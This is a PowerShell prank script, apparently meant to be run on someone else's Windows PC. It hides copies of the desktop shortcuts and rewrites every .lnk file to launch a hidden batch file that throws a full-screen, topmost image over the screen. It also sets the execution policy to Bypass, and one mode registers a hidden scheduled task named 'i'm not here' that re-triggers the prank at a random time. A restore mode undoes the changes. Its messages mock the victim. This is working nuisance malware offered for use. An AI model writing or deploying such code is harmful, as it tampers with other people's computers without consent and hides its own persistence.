if ($args -contains "without_empathy") {
    Write-Host "without_empathy mode activated ! ima f*ck that sh*t up !!!"
    $mode="without_empathy"
} elseif ($args -contains "with_empathy") {
    Write-Host "with_empathy mode activated, because he probably stronger than you i don't know"
    $mode="with_empathy"
} elseif ($args -contains "save_him_from_hell") {
    Write-Host "At least you're alive bruh`i hope it was woth it"
    $mode="save_him_from_hell"
} elseif ($args -contains "wtf_is_wrong_with_you") {
    Write-Host "yoooo wtf is wrong with you ?! you probably hate him right ??"
    $mode="wtf_is_wrong_with_you"
} elseif ($args -contains "ah_shit..._here_we_go_again") {
    $mode="ah_shit..._here_we_go_again"
} elseif ($args -contains "get_shrekt") {
    $mode="get_shrekt"
} else {
    Write-Host "wtf are you doing ? you just have to select a mode to use that sh*t"
    exit
}

Set-ExecutionPolicy -Scope CurrentUser Bypass

if ($mode -notin @("save_him_from_hell", "ah_shit..._here_we_go_again", "get_shrekt")) {

    $links = @()

    if ((Test-Path "C:\Users\$($env:USERNAME)\Desktop")) {$links+=dir "C:\Users\$($env:USERNAME)\Desktop\*.lnk"}
    if ((Test-Path "C:\Users\$($env:USERNAME)\OneDrive\Desktop")){$links+=dir "C:\Users\$($env:USERNAME)\OneDrive\Desktop\*.lnk"}

    if($links.Count -ge 1){

        New-Item -ItemType Directory "C:\Users\$($env:USERNAME)\Backup" -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "C:\Users\$($env:USERNAME)\Backup" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

        $i=0

        foreach ($link in $links) {
            if (!(Test-Path "C:\Users\$($env:USERNAME)\Backup\$i\$($link.Name)")) {
                New-Item -ItemType Directory "C:\Users\$($env:USERNAME)\Backup\$i" -ErrorAction SilentlyContinue
                Copy-Item $link.FullName "C:\Users\$($env:USERNAME)\Backup\$i" -ErrorAction SilentlyContinue
                "$i;$($link.FullName)" | Out-File -Append "C:\Users\$($env:USERNAME)\Backup\links.db" -Encoding ascii
                $i++
            }
        }

        if (!(Test-Path "C:\Users\$($env:USERNAME)\Data\data.png")) {
            New-Item -ItemType Directory "C:\Users\$($env:USERNAME)\Data" -ErrorAction SilentlyContinue
            Set-ItemProperty -Path "C:\Users\$($env:USERNAME)\Data" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
            Expand-Archive -Path ".\src\data.zip" -DestinationPath "C:\Users\$($env:USERNAME)\Data\"
        }

        Copy-Item ".\MEGA_links.ps1" "C:\Users\$($env:USERNAME)\Data\"

        New-Item -ItemType Directory "C:\Users\$($env:USERNAME)\Data\src" -ErrorAction SilentlyContinue
        Copy-Item ".\src\data.zip" "C:\Users\$($env:USERNAME)\Data\src"

        Copy-Item ".\save_him_from_hell.bat" "C:\Users\$($env:USERNAME)\Data\"

        if ($mode -eq "without_empathy") {
            "@echo off`nPowershell `"C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1`" `"get_shrekt`"`nPowershell `"C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1 `"save_him_from_hell`"`"" | Out-File "C:\Users\$($env:USERNAME)\Data\run.bat" -Encoding ascii
        } elseif ($mode -eq "with_empathy") {
            "@echo off`n`"C:\Users\$($env:USERNAME)\Data\data.png`"`nPowershell `"C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1 `"save_him_from_hell`"`"" | Out-File "C:\Users\$($env:USERNAME)\Data\run.bat" -Encoding ascii
        } elseif ($mode -eq "wtf_is_wrong_with_you") {
            "@echo off`nPowershell `"C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1`" `"get_shrekt`"`nPowershell `"C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1`" `"ah_shit..._here_we_go_again`"" | Out-File "C:\Users\$($env:USERNAME)\Data\run.bat" -Encoding ascii
        }

        $WshShell = New-Object -ComObject WScript.Shell

        foreach ($link in $links) {
            $shortcut = $WshShell.CreateShortcut($link.FullName)

            $shortcut.TargetPath = "C:\Users\$($env:USERNAME)\Data\run.bat"
            $shortcut.WindowStyle = 7

            $shortcut.Save()

        }

    }

} elseif ($mode -eq "save_him_from_hell"){
    
    Start-Transcript "C:\Users\$($env:USERNAME)\Backup\Data_Recovery.log" -Append

    foreach ($raw in (Get-Content "C:\Users\$($env:USERNAME)\Backup\links.db")) {
        $data=@{ $raw.Split(";")[0] = $raw.Split(";")[1] }
    }

    foreach ($id in $data.Keys) {
        Move-Item "C:\Users\$($env:USERNAME)\Backup\$id\$(($data[$id]).Split("\")[-1])" $data[$id] -Force
    }

    Remove-Item "C:\Users\$($env:USERNAME)\Backup\links.db"
    Remove-Item "C:\Users\$($env:USERNAME)\Data\save_him_from_hell.bat"
    Remove-Item "C:\Users\$($env:USERNAME)\Data\src\data.zip"
    Remove-Item "C:\Users\$($env:USERNAME)\Data\src"
    Remove-Item "C:\Users\$($env:USERNAME)\Data\data.png"
    Remove-Item "C:\Users\$($env:USERNAME)\Data\run.bat"

    foreach ($id in (Get-ChildItem "C:\Users\$($env:USERNAME)\Backup\")){
        Remove-Item "C:\Users\$($env:USERNAME)\Backup\$(($id).Name)"
    }

    $taskName = "i'm not here"

    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
    }

    Start-Process cmd.exe -ArgumentList "/c timeout 5 & del `"C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1`"" -WindowStyle Hidden

    Stop-Transcript

} elseif ($mode -eq "ah_shit..._here_we_go_again") {
    
    Start-Transcript "C:\Users\$($env:USERNAME)\Backup\Data_Recovery.log" -Append

    foreach ($raw in (Get-Content "C:\Users\$($env:USERNAME)\Backup\links.db")) {
        $data=@{ $raw.Split(";")[0] = $raw.Split(";")[1] }
    }

    foreach ($id in $data.Keys) {
        Move-Item "C:\Users\$($env:USERNAME)\Backup\$id\$(($data[$id]).Split("\")[-1])" $data[$id] -Force
    }

    Remove-Item "C:\Users\$($env:USERNAME)\Backup\links.db"

    foreach ($id in (Get-ChildItem "C:\Users\$($env:USERNAME)\Backup\")){
        Remove-Item "C:\Users\$($env:USERNAME)\Backup\$(($id).Name)"
    }

    Stop-Transcript

    $today = Get-Date
    $randomDays = Get-Random -Minimum 0 -Maximum 7
    $randomHour = Get-Random -Minimum 0 -Maximum 23
    $randomMinute = Get-Random -Minimum 0 -Maximum 59

    $randomDateTime = $today.AddDays($randomDays).Date.AddHours($randomHour).AddMinutes($randomMinute)

    $taskName = "i'm not here"

    $action = New-ScheduledTaskAction `
        -Execute "powershell.exe" `
        -Argument "-NoProfile -WindowStyle Hidden -File `"C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1`" `"wtf_is_wrong_with_you`""

    $trigger = New-ScheduledTaskTrigger -Once -At $randomDateTime

    $settings = New-ScheduledTaskSettingsSet `
        -Hidden `
        -StartWhenAvailable `
        -AllowStartIfOnBatteries `
        -DontStopIfGoingOnBatteries `
        -ExecutionTimeLimit (New-TimeSpan -Minutes 5) `
        -IdleDuration 30

    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
    }

    Register-ScheduledTask `
        -TaskName $taskName `
        -Action $action `
        -Trigger $trigger `
        -Settings $settings `
        -Force


} elseif ($mode -eq "get_shrekt") {

    Add-Type -AssemblyName PresentationFramework

    $window = New-Object Windows.Window
    $window.WindowStyle = 'None'
    $window.WindowState = 'Maximized'
    $window.Topmost = $true
    $window.Background = 'Black'

    $image = New-Object Windows.Controls.Image
    $image.Source = [Windows.Media.Imaging.BitmapImage]::new(
        [Uri]"C:\Users\$($env:USERNAME)\Data\data.png"
    )
    $image.Stretch = 'Uniform'

    $window.Content = $image
    $window.ShowDialog()

}

Set-ExecutionPolicy -Scope CurrentUser RemoteSigned